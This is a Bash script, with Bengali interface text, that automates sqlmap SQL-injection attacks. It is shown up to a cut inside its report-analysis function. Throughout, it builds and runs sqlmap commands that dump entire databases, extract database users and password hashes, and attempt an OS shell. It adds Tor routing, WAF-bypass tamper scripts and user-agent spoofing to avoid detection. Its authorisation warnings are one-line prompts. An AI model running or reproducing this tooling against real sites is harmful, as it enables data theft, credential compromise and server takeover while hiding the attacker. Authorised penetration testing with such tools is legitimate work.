#!/bin/bash

# ================================================================
#   SQLMAP - Full Automation Tool
#   Author: SAIMUM
# ================================================================

# --- Colors ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

RESULTS_DIR="$HOME/sqlmap_results"
HISTORY_FILE="$HOME/.sqlmap_saimum_history.log"
mkdir -p "$RESULTS_DIR"

# ================================================================
# BANNER
# ================================================================
show_banner() {
    clear
    echo -e "${RED}${BOLD}"
    echo ' ███████╗ ██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ '
    echo ' ██╔════╝██╔═══██╗██║     ████╗ ████║██╔══██╗██╔══██╗'
    echo ' ███████╗██║   ██║██║     ██╔████╔██║███████║██████╔╝'
    echo ' ╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██╔══██║██╔═══╝ '
    echo ' ███████║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║██║     '
    echo ' ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     '
    echo -e "${NC}"
    echo -e "${YELLOW}${BOLD}    ╔═══════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}${BOLD}    ║                    S A I M U M                        ║${NC}"
    echo -e "${YELLOW}${BOLD}    ╚═══════════════════════════════════════════════════════╝${NC}"
    echo -e "${DIM}${WHITE}          SQLmap Full Automation Tool | SQL Injection Scanner${NC}"
    echo ""
}

# ================================================================
# CHECK DEPENDENCIES
# ================================================================
check_deps() {
    echo -e "${CYAN}[*] Dependencies চেক করা হচ্ছে...${NC}"
    local missing=()
    for tool in sqlmap whois curl dig; do
        if ! command -v "$tool" &>/dev/null; then
            missing+=("$tool")
            echo -e "  ${RED}[✗] $tool — পাওয়া যায়নি${NC}"
        else
            echo -e "  ${GREEN}[✓] $tool${NC}"
        fi
    done

    # Tor optional
    echo ""
    if command -v tor &>/dev/null; then
        echo -e "  ${GREEN}[✓] tor — available (anonymous scan করা যাবে)${NC}"
        TOR_AVAILABLE=true
    else
        echo -e "  ${YELLOW}[!] tor — নেই (optional)${NC}"
        TOR_AVAILABLE=false
    fi

    if [ ${#missing[@]} -ne 0 ]; then
        echo ""
        echo -e "${RED}[!] Missing tools: ${missing[*]}${NC}"
        echo -e "${YELLOW}[*] Install করুন: sudo apt install ${missing[*]}${NC}"
        exit 1
    fi
    echo ""
}

# ================================================================
# WHOIS LOOKUP
# ================================================================
whois_lookup() {
    local domain=$1
    echo -e "${MAGENTA}${BOLD}┌─── WHOIS INFORMATION ─────────────────────────────┐${NC}"
    local result
    result=$(whois "$domain" 2>/dev/null | grep -E \
        "Registrar:|Registrant Name:|Country:|Creation Date:|Updated Date:|Name Server:|Organization:|Admin Email:" \
        | head -15)
    if [ -n "$result" ]; then
        echo "$result" | while IFS= read -r line; do
            echo -e "  ${WHITE}$line${NC}"
        done
    else
        echo -e "  ${YELLOW}[!] Whois data পাওয়া যায়নি।${NC}"
    fi
    echo -e "${MAGENTA}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ================================================================
# GEOIP LOOKUP
# ================================================================
geoip_lookup() {
    local domain=$1
    echo -e "${BLUE}${BOLD}┌─── GEO IP INFORMATION ────────────────────────────┐${NC}"
    local geo
    geo=$(curl -s --max-time 5 "http://ip-api.com/json/$domain" 2>/dev/null)
    if echo "$geo" | grep -q '"status":"success"'; then
        local country region city isp lat lon
        country=$(echo "$geo" | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
        region=$(echo  "$geo" | grep -o '"regionName":"[^"]*"' | cut -d'"' -f4)
        city=$(echo    "$geo" | grep -o '"city":"[^"]*"'       | cut -d'"' -f4)
        isp=$(echo     "$geo" | grep -o '"isp":"[^"]*"'        | cut -d'"' -f4)
        lat=$(echo     "$geo" | grep -o '"lat":[^,]*'          | cut -d':' -f2)
        lon=$(echo     "$geo" | grep -o '"lon":[^,]*'          | cut -d':' -f2)
        echo -e "  ${WHITE}Country   :${NC} ${GREEN}$country${NC}"
        echo -e "  ${WHITE}Region    :${NC} ${GREEN}$region${NC}"
        echo -e "  ${WHITE}City      :${NC} ${GREEN}$city${NC}"
        echo -e "  ${WHITE}ISP       :${NC} ${GREEN}$isp${NC}"
        echo -e "  ${WHITE}Lat / Lon :${NC} ${GREEN}$lat / $lon${NC}"
    else
        echo -e "  ${YELLOW}[!] GeoIP data পাওয়া যায়নি।${NC}"
    fi
    echo -e "${BLUE}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ================================================================
# REVERSE DNS
# ================================================================
reverse_dns() {
    local domain=$1
    echo -e "${GREEN}${BOLD}┌─── REVERSE DNS LOOKUP ────────────────────────────┐${NC}"
    local ip result
    ip=$(dig +short "$domain" 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
    result=$(dig -x "$ip" +short 2>/dev/null)
    echo -e "  ${WHITE}Domain    :${NC} ${GREEN}$domain${NC}"
    echo -e "  ${WHITE}IP        :${NC} ${GREEN}${ip:-পাওয়া যায়নি}${NC}"
    echo -e "  ${WHITE}Hostname  :${NC} ${GREEN}${result:-কোনো rDNS রেকর্ড নেই}${NC}"
    echo -e "${GREEN}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ================================================================
# HTTP HEADER CHECK
# ================================================================
http_header_check() {
    local target=$1
    echo -e "${CYAN}${BOLD}┌─── HTTP HEADER PRE-CHECK ─────────────────────────┐${NC}"
    local headers
    headers=$(curl -s -I --max-time 8 "$target" 2>/dev/null | head -20)
    if [ -n "$headers" ]; then
        local server powered code
        code=$(echo    "$headers" | head -1)
        server=$(echo  "$headers" | grep -i "^Server:"       | head -1)
        powered=$(echo "$headers" | grep -i "^X-Powered-By:" | head -1)
        echo -e "  ${WHITE}Status    :${NC} ${GREEN}$code${NC}"
        [ -n "$server"  ] && echo -e "  ${WHITE}Server    :${NC} ${YELLOW}$server${NC}"
        [ -n "$powered" ] && echo -e "  ${WHITE}Powered By:${NC} ${YELLOW}$powered${NC}"

        # WAF detection hint
        echo ""
        echo -e "  ${CYAN}WAF Detection:${NC}"
        local waf_detected=false
        for waf_header in "X-WAF" "X-Sucuri" "X-Firewall" "cf-ray" "X-CDN"; do
            if echo "$headers" | grep -qi "^$waf_header:"; then
                echo -e "    ${RED}[!] WAF Detected: $waf_header — Tamper script লাগতে পারে।${NC}"
                waf_detected=true
            fi
        done
        $waf_detected || echo -e "    ${GREEN}[✓] স্পষ্ট WAF header দেখা যাচ্ছে না।${NC}"
    else
        echo -e "  ${YELLOW}[!] HTTP response নেই বা target unreachable।${NC}"
    fi
    echo -e "${CYAN}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ================================================================
# PRE-SCAN RECON
# ================================================================
pre_scan_recon() {
    local target=$1
    local domain
    domain=$(echo "$target" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1)
    echo ""
    echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${RED}${BOLD}   PRE-SCAN RECON  ›  $target${NC}"
    echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    whois_lookup      "$domain"
    geoip_lookup      "$domain"
    reverse_dns       "$domain"
    http_header_check "$target"
}

# ================================================================
# STEP 1 — TARGET TYPE
# ================================================================
get_target() {
    TARGET=""
    TARGET_OPT=""
    REQUEST_FILE=""

    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║      STEP 1 — TARGET TYPE                                           ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${GREEN}1)${NC} Single URL          ${DIM}e.g. http://target.com/page?id=1${NC}"
    echo -e "  ${GREEN}2)${NC} POST data দিয়ে      ${DIM}form submission এর মতো${NC}"
    echo -e "  ${GREEN}3)${NC} Burp request file   ${DIM}Burp Suite থেকে save করা .txt file${NC}"
    echo -e "  ${GREEN}4)${NC} Multiple URL file   ${DIM}একটা file এ অনেক URL${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"Select [1-4]: "${NC})" ttype

    case $ttype in
        1)
            read -p "$(echo -e ${WHITE}"URL দিন: "${NC})" TARGET
            TARGET_OPT="-u \"$TARGET\""
            ;;
        2)
            read -p "$(echo -e ${WHITE}"URL দিন: "${NC})" TARGET
            echo -e "  ${DIM}POST data format: param1=val1&param2=val2${NC}"
            read -p "$(echo -e ${WHITE}"POST data দিন: "${NC})" post_data
            TARGET_OPT="-u \"$TARGET\" --data=\"$post_data\""
            ;;
        3)
            read -p "$(echo -e ${WHITE}"Request file path দিন: "${NC})" req_file
            if [ ! -f "$req_file" ]; then
                echo -e "${RED}[!] File পাওয়া যায়নি।${NC}"
                get_target; return
            fi
            REQUEST_FILE="$req_file"
            TARGET=$(grep -i "^Host:" "$req_file" | awk '{print $2}' | tr -d '\r')
            TARGET_OPT="-r \"$req_file\""
            ;;
        4)
            read -p "$(echo -e ${WHITE}"URL file path দিন: "${NC})" url_file
            if [ ! -f "$url_file" ]; then
                echo -e "${RED}[!] File পাওয়া যায়নি।${NC}"
                get_target; return
            fi
            TARGET="multiple_urls"
            TARGET_OPT="-m \"$url_file\""
            ;;
        *)
            echo -e "${RED}[!] ভুল অপশন।${NC}"
            get_target; return
            ;;
    esac

    echo -e "  ${GREEN}[✓] Target set।${NC}"
    echo ""
}

# ================================================================
# STEP 2 — INJECTION POINT
# ================================================================
get_injection_point() {
    PARAM_OPT=""
    COOKIE_INJ_OPT=""
    HEADER_INJ_OPT=""

    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║      STEP 2 — INJECTION POINT                                       ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${GREEN}1)${NC} Auto detect     ${DIM}— SQLmap নিজে সব parameter test করবে${NC}"
    echo -e "  ${GREEN}2)${NC} Specific param  ${DIM}— কোন parameter inject করবে বলে দাও${NC}"
    echo -e "  ${GREEN}3)${NC} Cookie তে inject"
    echo -e "  ${GREEN}4)${NC} Header তে inject ${DIM}(User-Agent, Referer, X-Forwarded-For)${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"Select [1-4]: "${NC})" inj_ch

    case $inj_ch in
        1)
            echo -e "  ${GREEN}[✓] Auto detect mode।${NC}"
            ;;
        2)
            read -p "$(echo -e ${WHITE}"Parameter name দিন (e.g. id): "${NC})" param_in
            PARAM_OPT="-p $param_in"
            echo -e "  ${GREEN}[✓] Parameter: $param_in${NC}"
            ;;
        3)
            read -p "$(echo -e ${WHITE}"Cookie value দিন (e.g. PHPSESSID=abc123): "${NC})" cookie_val
            COOKIE_INJ_OPT="--cookie=\"$cookie_val\""
            echo -e "  ${GREEN}[✓] Cookie injection set।${NC}"
            ;;
        4)
            echo ""
            echo -e "  ${CYAN}Header type:${NC}"
            echo -e "  ${GREEN}1)${NC} User-Agent"
            echo -e "  ${GREEN}2)${NC} Referer"
            echo -e "  ${GREEN}3)${NC} X-Forwarded-For"
            echo -e "  ${GREEN}4)${NC} Custom header"
            read -p "$(echo -e ${YELLOW}"  Select [1-4]: "${NC})" hdr_ch
            case $hdr_ch in
                1) HEADER_INJ_OPT="--level=5 --header=\"User-Agent: *\"" ;;
                2) HEADER_INJ_OPT="--level=5 --header=\"Referer: *\"" ;;
                3) HEADER_INJ_OPT="--header=\"X-Forwarded-For: *\"" ;;
                4)
                    read -p "$(echo -e ${WHITE}"  Header name: "${NC})" hdr_name
                    HEADER_INJ_OPT="--header=\"$hdr_name: *\""
                    ;;
            esac
            echo -e "  ${GREEN}[✓] Header injection set।${NC}"
            ;;
    esac
    echo ""
}

# ================================================================
# STEP 3 — ATTACK CONFIG
# ================================================================
get_attack_config() {
    TECHNIQUE_OPT=""
    RISK_OPT=""
    LEVEL_OPT=""
    DBMS_OPT=""
    THREADS_OPT=""

    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║      STEP 3 — ATTACK CONFIG                                         ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Technique
    echo -e "  ${CYAN}${BOLD}Injection Technique:${NC}"
    echo -e "  ${DIM}(একাধিক হলে একসাথে লিখুন, e.g: BEU)${NC}"
    echo ""
    echo -e "  ${GREEN}B)${NC} Boolean-based blind  ${DIM}— সবচেয়ে common, সব DB তে কাজ করে${NC}"
    echo -e "  ${GREEN}E)${NC} Error-based          ${DIM}— দ্রুত, DB error দেখায়${NC}"
    echo -e "  ${GREEN}U)${NC} Union-based          ${DIM}— সবচেয়ে দ্রুত, UNION SELECT ব্যবহার করে${NC}"
    echo -e "  ${GREEN}S)${NC} Stacked queries      ${DIM}— multiple query একসাথে, OS command সম্ভব${NC}"
    echo -e "  ${GREEN}T)${NC} Time-based blind     ${DIM}— slow কিন্তু reliable, SLEEP() ব্যবহার করে${NC}"
    echo -e "  ${GREEN}Q)${NC} Inline queries       ${DIM}— subquery based${NC}"
    echo -e "  ${GREEN}A)${NC} সব technique একসাথে ${DIM}(recommended)${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"Technique [B/E/U/S/T/Q বা A=সব]: "${NC})" tech_in
    if [[ "$tech_in" =~ ^[Aa]$ ]] || [ -z "$tech_in" ]; then
        TECHNIQUE_OPT="--technique=BEUSTQ"
    else
        TECHNIQUE_OPT="--technique=${tech_in^^}"
    fi
    echo -e "  ${GREEN}[✓] Technique: $TECHNIQUE_OPT${NC}"

    # Risk Level
    echo ""
    echo -e "  ${CYAN}${BOLD}Risk Level:${NC}"
    echo -e "  ${GREEN}1)${NC} Low    ${DIM}— safe, normal test (default)${NC}"
    echo -e "  ${GREEN}2)${NC} Medium ${DIM}— OR based tests যোগ হবে${NC}"
    echo -e "  ${GREEN}3)${NC} High   ${DIM}— সব risky payload — ${RED}DB damage হতে পারে!${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"Risk [1-3, Enter=1]: "${NC})" risk_in
    case $risk_in in
        2) RISK_OPT="--risk=2" ;;
        3)
            echo -e "  ${RED}[!] Warning: Risk 3 database এ damage করতে পারে!${NC}"
            read -p "$(echo -e ${YELLOW}"  নিশ্চিত? (y/n): "${NC})" confirm
            [[ "$confirm" =~ ^[Yy]$ ]] && RISK_OPT="--risk=3" || RISK_OPT="--risk=1"
            ;;
        *) RISK_OPT="--risk=1" ;;
    esac
    echo -e "  ${GREEN}[✓] Risk: $RISK_OPT${NC}"

    # Level
    echo ""
    echo -e "  ${CYAN}${BOLD}Test Level:${NC}"
    echo -e "  ${GREEN}1)${NC} Level 1 — Basic tests only (default, দ্রুত)"
    echo -e "  ${GREEN}2)${NC} Level 2 — Cookie parameters যোগ"
    echo -e "  ${GREEN}3)${NC} Level 3 — User-Agent, Referer যোগ"
    echo -e "  ${GREEN}4)${NC} Level 4 — আরো বেশি payload"
    echo -e "  ${GREEN}5)${NC} Level 5 — সব possible test (ধীর)"
    echo ""
    read -p "$(echo -e ${YELLOW}"Level [1-5, Enter=1]: "${NC})" level_in
    [[ "$level_in" =~ ^[1-5]$ ]] && LEVEL_OPT="--level=$level_in" || LEVEL_OPT="--level=1"
    echo -e "  ${GREEN}[✓] Level: $LEVEL_OPT${NC}"

    # DBMS
    echo ""
    echo -e "  ${CYAN}${BOLD}Database type জানা আছে?${NC}"
    echo -e "  ${GREEN}1)${NC} Auto detect"
    echo -e "  ${GREEN}2)${NC} MySQL"
    echo -e "  ${GREEN}3)${NC} MSSQL (SQL Server)"
    echo -e "  ${GREEN}4)${NC} PostgreSQL"
    echo -e "  ${GREEN}5)${NC} Oracle"
    echo -e "  ${GREEN}6)${NC} SQLite"
    echo -e "  ${GREEN}7)${NC} MongoDB"
    echo ""
    read -p "$(echo -e ${YELLOW}"DBMS [1-7, Enter=1]: "${NC})" dbms_ch
    case $dbms_ch in
        2) DBMS_OPT="--dbms=mysql"      ;;
        3) DBMS_OPT="--dbms=mssql"      ;;
        4) DBMS_OPT="--dbms=postgresql" ;;
        5) DBMS_OPT="--dbms=oracle"     ;;
        6) DBMS_OPT="--dbms=sqlite"     ;;
        7) DBMS_OPT="--dbms=mongodb"    ;;
        *) ;;
    esac
    [ -n "$DBMS_OPT" ] && echo -e "  ${GREEN}[✓] DBMS: $DBMS_OPT${NC}"

    # Threads
    echo ""
    read -p "$(echo -e ${WHITE}"Threads কতটা? (Enter = 5): "${NC})" th_in
    [ -n "$th_in" ] && THREADS_OPT="--threads=$th_in" || THREADS_OPT="--threads=5"
    echo -e "  ${GREEN}[✓] Threads: ${th_in:-5}${NC}"
    echo ""
}

# ================================================================
# STEP 4 — WHAT TO EXTRACT
# ================================================================
get_extraction_goal() {
    EXTRACT_OPT=""

    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║      STEP 4 — কী বের করবেন?                                        ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${GREEN}1)${NC} শুধু vulnerability check   ${DIM}— inject হয় কিনা দেখো${NC}"
    echo -e "  ${GREEN}2)${NC} Database names বের করো    ${DIM}— কোন কোন DB আছে${NC}"
    echo -e "  ${GREEN}3)${NC} Tables বের করো            ${DIM}— একটা DB এর সব table${NC}"
    echo -e "  ${GREEN}4)${NC} Columns বের করো           ${DIM}— একটা table এর সব column${NC}"
    echo -e "  ${GREEN}5)${NC} সব data dump করো          ${DIM}— পুরো DB dump${NC}"
    echo -e "  ${GREEN}6)${NC} Users & Passwords বের করো ${DIM}— DB user credentials${NC}"
    echo -e "  ${GREEN}7)${NC} OS Shell নেওয়ার চেষ্টা   ${DIM}— ${RED}শুধু authorized test এ!${NC}"
    echo -e "  ${GREEN}8)${NC} সব একসাথে                 ${DIM}— maximum extraction${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"Select [1-8]: "${NC})" ext_ch

    case $ext_ch in
        1) EXTRACT_OPT="" ;;
        2) EXTRACT_OPT="--dbs" ;;
        3)
            read -p "$(echo -e ${WHITE}"  Database name দিন: "${NC})" db_name
            EXTRACT_OPT="-D $db_name --tables"
            ;;
        4)
            read -p "$(echo -e ${WHITE}"  Database name দিন: "${NC})" db_name
            read -p "$(echo -e ${WHITE}"  Table name দিন: "${NC})" tbl_name
            EXTRACT_OPT="-D $db_name -T $tbl_name --columns"
            ;;
        5)
            read -p "$(echo -e ${WHITE}"  Database name দিন (Enter = সব): "${NC})" db_name
            if [ -n "$db_name" ]; then
                EXTRACT_OPT="-D $db_name --dump"
            else
                EXTRACT_OPT="--dump-all"
            fi
            ;;
        6) EXTRACT_OPT="--users --passwords --privileges" ;;
        7)
            echo -e "  ${RED}[!] Warning: OS shell শুধু authorized penetration test এ ব্যবহার করুন!${NC}"
            read -p "$(echo -e ${YELLOW}"  নিশ্চিত? (y/n): "${NC})" confirm
            [[ "$confirm" =~ ^[Yy]$ ]] && EXTRACT_OPT="--os-shell" || EXTRACT_OPT="--dbs"
            ;;
        8) EXTRACT_OPT="--dbs --tables --users --passwords --privileges" ;;
        *) EXTRACT_OPT="--dbs" ;;
    esac

    echo -e "  ${GREEN}[✓] Extraction goal set।${NC}"
    echo ""
}

# ================================================================
# STEP 5 — EXTRA OPTIONS
# ================================================================
get_extra_options() {
    PROXY_OPT=""
    TOR_OPT=""
    TAMPER_OPT=""
    WAF_OPT=""
    DELAY_OPT=""
    AGENT_OPT=""
    BATCH_OPT="--batch"

    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║      STEP 5 — EXTRA OPTIONS (সব optional, Enter = skip)            ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Tor / Proxy
    echo -e "  ${CYAN}Anonymity:${NC}"
    echo -e "  ${GREEN}1)${NC} None (direct)"
    echo -e "  ${GREEN}2)${NC} Proxy (e.g. Burp Suite)"
    if $TOR_AVAILABLE; then
        echo -e "  ${GREEN}3)${NC} Tor network"
    fi
    echo ""
    read -p "$(echo -e ${YELLOW}"  Select [1-3]: "${NC})" anon_ch
    case $anon_ch in
        2)
            read -p "$(echo -e ${WHITE}"  Proxy (e.g. http://127.0.0.1:8080): "${NC})" proxy_in
            PROXY_OPT="--proxy=$proxy_in"
            echo -e "  ${GREEN}[✓] Proxy: $proxy_in${NC}"
            ;;
        3)
            if $TOR_AVAILABLE; then
                TOR_OPT="--tor --tor-type=SOCKS5 --check-tor"
                echo -e "  ${GREEN}[✓] Tor: ON${NC}"
            fi
            ;;
    esac

    # Tamper scripts (WAF bypass)
    echo ""
    echo -e "  ${CYAN}WAF Bypass Tamper Script:${NC}"
    echo -e "  ${GREEN}1)${NC} None"
    echo -e "  ${GREEN}2)${NC} space2comment      ${DIM}— space কে comment এ পরিণত করে${NC}"
    echo -e "  ${GREEN}3)${NC} between            ${DIM}— keyword এর মাঝে random comment${NC}"
    echo -e "  ${GREEN}4)${NC} randomcase         ${DIM}— random uppercase/lowercase${NC}"
    echo -e "  ${GREEN}5)${NC} charencode         ${DIM}— URL encoding${NC}"
    echo -e "  ${GREEN}6)${NC} space2dash         ${DIM}— space কে dash comment এ বদলায়${NC}"
    echo -e "  ${GREEN}7)${NC} একাধিক tamper একসাথে (recommended for WAF)"
    echo ""
    read -p "$(echo -e ${YELLOW}"  Select [1-7]: "${NC})" tamper_ch
    case $tamper_ch in
        2) TAMPER_OPT="--tamper=space2comment" ;;
        3) TAMPER_OPT="--tamper=between" ;;
        4) TAMPER_OPT="--tamper=randomcase" ;;
        5) TAMPER_OPT="--tamper=charencode" ;;
        6) TAMPER_OPT="--tamper=space2dash" ;;
        7) TAMPER_OPT="--tamper=space2comment,between,randomcase,charencode" ;;
        *) ;;
    esac
    [ -n "$TAMPER_OPT" ] && echo -e "  ${GREEN}[✓] Tamper: $TAMPER_OPT${NC}"

    # Delay
    echo ""
    read -p "$(echo -e ${WHITE}"Request এর মাঝে delay দেবেন? seconds (Enter = 0): "${NC})" delay_in
    if [ -n "$delay_in" ] && [ "$delay_in" -gt 0 ] 2>/dev/null; then
        DELAY_OPT="--delay=$delay_in"
        echo -e "  ${GREEN}[✓] Delay: ${delay_in}s${NC}"
    fi

    # User-Agent
    echo ""
    echo -e "  ${CYAN}User-Agent:${NC}"
    echo -e "  ${GREEN}1)${NC} Default (sqlmap)"
    echo -e "  ${GREEN}2)${NC} Random browser agent"
    echo -e "  ${GREEN}3)${NC} Googlebot"
    read -p "$(echo -e ${YELLOW}"  Select [1-3, Enter=2]: "${NC})" ua_ch
    case $ua_ch in
        1) ;;
        3) AGENT_OPT="--user-agent=\"Googlebot/2.1\"" ;;
        *) AGENT_OPT="--random-agent" ;;
    esac
    [ -n "$AGENT_OPT" ] && echo -e "  ${GREEN}[✓] User-Agent set।${NC}"

    # Interactive mode
    echo ""
    read -p "$(echo -e ${WHITE}"Interactive mode চালু করবেন? SQLmap নিজে নিজে সিদ্ধান্ত নেবে না (y/n): "${NC})" inter_yn
    [[ "$inter_yn" =~ ^[Yy]$ ]] && BATCH_OPT="" && \
        echo -e "  ${GREEN}[✓] Interactive mode: ON${NC}" || \
        echo -e "  ${GREEN}[✓] Batch mode: ON (auto-answer yes)${NC}"

    echo ""
}

# ================================================================
# STEP 6 — BUILD & RUN
# ================================================================
build_and_run() {
    local ts
    ts=$(date +"%Y%m%d_%H%M%S")
    local out_dir="$RESULTS_DIR/scan_$ts"
    mkdir -p "$out_dir"

    local final_cmd
    final_cmd=$(echo "sqlmap $TARGET_OPT $PARAM_OPT $COOKIE_INJ_OPT $HEADER_INJ_OPT \
        $TECHNIQUE_OPT $RISK_OPT $LEVEL_OPT $DBMS_OPT $THREADS_OPT \
        $EXTRACT_OPT \
        $PROXY_OPT $TOR_OPT $TAMPER_OPT $DELAY_OPT $AGENT_OPT \
        $BATCH_OPT --output-dir=$out_dir" | tr -s ' ')

    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║      STEP 6 — CONFIRM & RUN                                         ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${WHITE}Target  : ${GREEN}${BOLD}$TARGET${NC}"
    echo -e "  ${WHITE}Command : ${YELLOW}$final_cmd${NC}"
    echo -e "  ${WHITE}Output  : ${CYAN}$out_dir${NC}"
    echo ""
    echo -e "  ${RED}[!] শুধুমাত্র নিজের বা permission আছে এমন target এ ব্যবহার করুন!${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"[?] Scan শুরু করবেন? (y/n): "${NC})" go
    [[ ! "$go" =~ ^[Yy]$ ]] && return

    local tmp_scan tmp_bangla
    tmp_scan=$(mktemp)
    tmp_bangla=$(mktemp)

    echo ""
    echo -e "${GREEN}${BOLD}[*] SQLmap scan শুরু হচ্ছে...${NC}"
    echo ""

    # Real SQLmap — হুবহু original terminal output
    eval "$final_cmd" 2>&1 | tee "$tmp_scan"

    echo ""
    echo -e "${GREEN}${BOLD}[✓] Scan সম্পন্ন!${NC}"

    bangla_analysis   "$tmp_scan" "$tmp_bangla"
    suggest_next_tool "$tmp_scan"
    save_results      "$tmp_scan" "$tmp_bangla" "$out_dir"

    rm -f "$tmp_scan" "$tmp_bangla"
}

# ================================================================
# BANGLA ANALYSIS
# ================================================================
bangla_analysis() {
    local outfile=$1
    local report_file=$2

    {
    echo ""
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║             বাংলায় স্ক্যান রিপোর্ট বিশ্লেষণ                      ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    local critical=0 high=0 medium=0 info=0

    # Vulnerable found
    if grep -qi "is vulnerable\|sqlmap identified\|parameter.*is vulnerable" "$outfile" 2>/dev/null; then
        critical=$((critical+1))
        echo -e "  ${RED}${BOLD}🚨 SQL Injection Vulnerability নিশ্চিত হয়েছে!${NC}"
        echo -e "     ${WHITE}→ এই parameter টিতে SQL Injection সম্ভব।${NC}"
        echo -e "     ${WHITE}→ Database এর সম্পূর্ণ নিয়ন্ত্রণ নেওয়া সম্ভব হতে পারে।${NC}"
        echo -e "     ${RED}→ ঝুঁকি: CRITICAL${NC}"; echo ""
    fi

    # Technique found
    if grep -qi "boolean-based blind" "$outfile" 2>/dev/null; then
        critical=$((critical+1))
        echo -e "  ${RED}${BOLD}🚨 Boolean-Based Blind SQLi পাওয়া গেছে!${NC}"
        echo -e "     ${WHITE}→ True/False response দেখে data বের করা সম্ভব।${NC}"
        echo -e "     ${WHITE}→ ধীরে হলেও পুরো database dump করা যাবে।${NC}"
        echo -e "     ${RED}→ ঝুঁকি: CRITICAL${NC}"; echo ""
    fi

    if grep -qi "error-based" "$outfile" 2>/dev/null; then
        critical=$((critical+1))
        echo -e "  ${RED}${BOLD}🚨 Error-Based SQLi পাওয়া গেছে!${NC}"
        echo -e "     ${WHITE}→ Database error message এ sensitive data দেখা যাচ্ছে।${NC}"
        echo -e "     ${WHITE}→ দ্রুত data extraction সম্ভব।${NC}"
        echo -e "     ${RED}→ ঝুঁকি: CRITICAL${NC}"; echo ""
    fi

    if grep -qi "union-based\|UNION.*SELECT" "$outfile" 2>/dev/null; then
        critical=$((critical+1))
        echo -e "  ${RED}${BOLD}🚨 UNION-Based SQLi পাওয়া গেছে!${NC}"
        echo -e "     ${WHITE}→ সবচেয়ে দ্রুত ও শক্তিশালী injection।${NC}"
        echo -e "     ${WHITE}→ একটি request এই অনেক data বের করা সম্ভব।${NC}"
        echo -e "     ${RED}→ ঝুঁকি: CRITICAL${NC}"; echo ""
    fi

    if grep -qi "time-based blind" "$outfile" 2>/dev/null; then
        high=$((high+1))
        echo -e "  ${YELLOW}${BOLD}⚠ Time-Based Blind SQLi পাওয়া গেছে!${NC}"
        echo -e "     ${WHITE}→ SLEEP() function দিয়ে data বের করা হচ্ছে।${NC}"
        echo -e "     ${WHITE}→ ধীরে হলেও কাজ করে — database dump সম্ভব।${NC}"
        echo -e "     ${YELLOW}→ ঝুঁকি: HIGH${NC}"; echo ""
    fi

    if grep -qi "stacked queries" "$outfile" 2>/dev/null; then
        critical=$((critical+1))
        echo -e "  ${RED}${BOLD}🚨 Stacked Queries SQLi পাওয়া গেছে!${NC}"
        echo -e "     ${WHITE}→ Multiple SQL query একসাথে চালানো সম্ভব।${NC}"
        echo -e "     ${WHITE}→ OS command execution পর্যন্ত যাওয়া সম্ভব!${NC}"
        echo -e "     ${RED}→ ঝুঁকি: CRITICAL${NC}"; echo ""
    fi

    # Database info found
    if grep -qi "available databases\|current database:" "$outfile" 2>/dev/null; then
        critical=$((critical+1))
        echo -e "  ${RED}${BOLD}🚨 Database Names বের হয়েছে!${NC}"
        grep -i "^\[.*\].*database\|available databases\|^\*" "$outfile" | head -5 | while read -r line; do
            echo -e "     ${YELLOW}→ $line${NC}"
        done
        echo -e "     ${WHITE}→ Database structure সম্পূর্ণ exposed।${NC}"
